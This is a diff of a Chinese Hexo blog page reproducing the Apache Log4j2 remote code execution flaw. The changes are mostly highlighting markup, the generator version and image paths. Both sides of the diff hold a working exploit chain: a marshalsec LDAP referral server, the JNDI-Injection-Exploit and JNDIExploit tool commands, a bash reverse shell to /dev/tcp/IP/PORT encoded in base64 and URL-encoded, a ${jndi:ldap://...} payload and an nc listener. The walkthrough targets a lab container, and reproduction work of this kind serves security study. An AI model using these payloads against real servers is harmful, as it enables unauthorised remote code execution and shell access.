@@ -44,7 +44,7 @@
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -566,14 +566,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    625
+                    603
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -597,7 +597,7 @@
 <h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>详细见<a target="_blank" rel="noopener" href="https://github.com/KagamigawaMeguri/apache-log4j-rce-poc"> apache-log4j-rce-poc</a></p>
 <h2 id="远程复现"><a href="#远程复现" class="headerlink" title="远程复现"></a>远程复现</h2><p><strong>环境</strong>1</p>
 <p>这个环境需要用rmi</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker run -d -P vulfocus&#x2F;log4j2-rce-2021-12-09:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">POST &#x2F;hello HTTP&#x2F;1.1 Host: 127.0.0.1:55000 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 39 payload&#x3D;xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -629,36 +629,36 @@
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">javac Log4jRCE.java # linux可能不附带javac，需要自行安装jdk，当然也可以用IDEA
-php -S 127.0.0.1:8888  # python或php均可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac Log4jRCE.java <span class="token comment"># linux可能不附带javac，需要自行安装jdk，当然也可以用IDEA</span>
+php -S <span class="token number">127.0</span>.0.1:8888  <span class="token comment"># python或php均可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>2.启动ldap server</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec
-cd marshalsec
-mvn clean package -DskipTests # 需要安装maven
-java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;#Log4jRCE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/mbechler/marshalsec
+<span class="token builtin class-name">cd</span> marshalsec
+mvn clean package -DskipTests <span class="token comment"># 需要安装maven</span>
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/<span class="token comment">#Log4jRCE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>3.打入payload</p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211001809222.png"></p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211001826534.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211001809222.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211001826534.png"></p>
 <h3 id="JNDI-Injection-Exploit"><a href="#JNDI-Injection-Exploit" class="headerlink" title="JNDI-Injection-Exploit"></a>JNDI-Injection-Exploit</h3><p>用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>的话就可以一键了。</p>
 <p>先用base64加密下反弹shell命令以防错误</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1
-# &#x3D;&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/IP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
+<span class="token comment"># => YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|bash&quot; -A IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE=&#125;|&#123;base64,-d&#125;|bash"</span> -A IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>确保1099、1389、8180端口可用</p>
 </blockquote>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211170346324.png"></p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211150557399.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211170346324.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211150557399.png"></p>
 <ul>
 <li><p>vulfocus</p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211204918179.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211204918179.png"></p>
 </li>
 <li><p>一般环境</p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211204951640.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211204951640.png"></p>
 </li>
 </ul>
 <h3 id="JNDIExploit"><a href="#JNDIExploit" class="headerlink" title="JNDIExploit"></a>JNDIExploit</h3><blockquote>
@@ -666,19 +666,19 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a>更好使！能看到command执行情况，不然都发现不了问题。</p>
 <p>先<strong>base64编码</strong>，然后将里面的+号进行<strong>两次url编码</strong>(hackbar与bp需要)</p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211202943765.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211202943765.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1
 # &#x3D;&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE&#x3D;
 # &#x3D;&gt; YmFzaCAtaSA%252BJiAvZGV2L3RjcC9JUC9QT1JUIDA%252BJjE%253D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>然后启动<code>JNDIExploit</code></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDIExploit.jar -i 192.168.110.131 -l 1389 -p 8180<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar JNDIExploit.jar -i <span class="token number">192.168</span>.110.131 -l <span class="token number">1389</span> -p <span class="token number">8180</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC9JUC9QT1JUIDA%252BJjE%253D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>如果不处理<code>+</code>，打进去的命令就会变成：</p>
-<p><img src="./../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211202615888.png"></p>
+<p><img src="../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211202615888.png"></p>
 <h2 id="QA"><a href="#QA" class="headerlink" title="QA"></a>QA</h2><p>弹shell报：</p>
 <p><code>nc: getnameinfo: Temporary failure in name resolution</code></p>
 <p>尝试用<code>nc -lvnp port</code></p>
